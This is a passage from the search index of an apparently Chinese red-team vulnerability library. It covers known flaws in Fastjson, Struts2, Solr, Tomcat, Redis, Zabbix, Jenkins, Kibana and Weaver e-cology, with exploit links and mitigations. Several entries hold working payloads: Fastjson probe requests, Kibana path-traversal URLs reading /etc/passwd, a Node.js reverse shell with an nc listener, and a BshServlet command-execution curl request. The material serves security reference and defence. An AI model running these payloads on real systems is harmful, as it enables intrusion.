\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson","text":"","title":"Fastjson\u53cd\u5e8f\u5217\u5316"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson-1222-1224","text":"\u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 \u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 \u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/","title":"Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#struts","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts","title":"Struts\u7cfb\u5217\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#solr","text":"\u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3","title":"Solr\u7cfb\u5217"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat","text":"","title":"Tomcat\u7c7b"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat-cve-2020-1938","text":"\u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat","title":"Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#session","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002","title":"session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#redis","text":"\u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/","title":"Redis\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#zabbix","text":"\u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/","title":"Zabbix\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#jenkins","text":"\u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Jenkins\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibana","text":"","title":"Kibana\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2019-7609","text":"\u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 \uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c","title":"Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2018-17246","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246","title":"Kibana\u6f0f\u6d1eCVE-2018-17246"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa","text":"","title":"\u6cdb\u5faeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_1","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b 